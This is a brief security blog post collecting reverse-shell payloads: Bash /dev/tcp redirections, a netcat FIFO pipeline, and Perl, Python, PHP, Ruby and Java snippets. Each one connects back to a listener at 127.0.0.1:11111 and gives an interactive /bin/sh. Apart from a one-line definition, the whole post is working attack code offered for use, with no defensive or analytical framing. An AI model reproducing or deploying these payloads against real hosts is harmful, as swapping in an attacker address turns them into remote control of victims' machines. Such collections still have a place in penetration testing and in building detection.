---
layout: post
title: Reverse Shell Collection
date: 2018-08-28 23:34 +0800
tags:
  - Security
---

Reverse shells connect back from the victim to yourself with a shell.

{% include toc.html %}

### Bash

```shell
#
bash -i >& /dev/tcp/127.0.0.1/11111 0>&1

#
bash -c 'bash -i >& /dev/tcp/127.0.0.1/11111 0>&1'

#
tmpdir=`mktemp -d`
sock=$tmpdir/socket
mkfifo $sock
cat $sock | /bin/sh -i 2>&1 | nc 127.0.0.1 11111 > $sock
rm -rf $tmpdir

#
0<&196
exec 196<>/dev/tcp/127.0.0.1/11111
sh <&196 >&196 2>&196

#
exec 5<>/dev/tcp/127.0.0.1/11111
cat <&5 | while read line; do $line 2>&5 >&5; done  

#
exec 5<>/dev/tcp/127.0.0.1/11111
while read line 0<&5; do $line 2>&5 >&5; done

#
perl -e 'use Socket;$i="127.0.0.1";$p=11111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",11111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#
php -r '$sock=fsockopen("127.0.0.1",11111);exec("/bin/sh -i <&3 >&3 2>&3");'

#
ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",11111).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Perl

```perl
use Socket;

$i = "127.0.0.1";
$p = 11111;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));

if (connect(S, sockaddr_in($p,inet_aton($i)))) {
  open(STDIN, ">&S");
  open(STDOUT,">&S");
  open(STDERR,">&S");
  exec("/bin/sh -i");
}
```

### Python

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 11111))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(['/bin/sh', '-i'])
```

### PHP

```php
<?php
$sock = fsockopen("127.0.0.1", 11111);
exec("/bin/sh -i <&3 >&3 2>&3");
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/11111;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
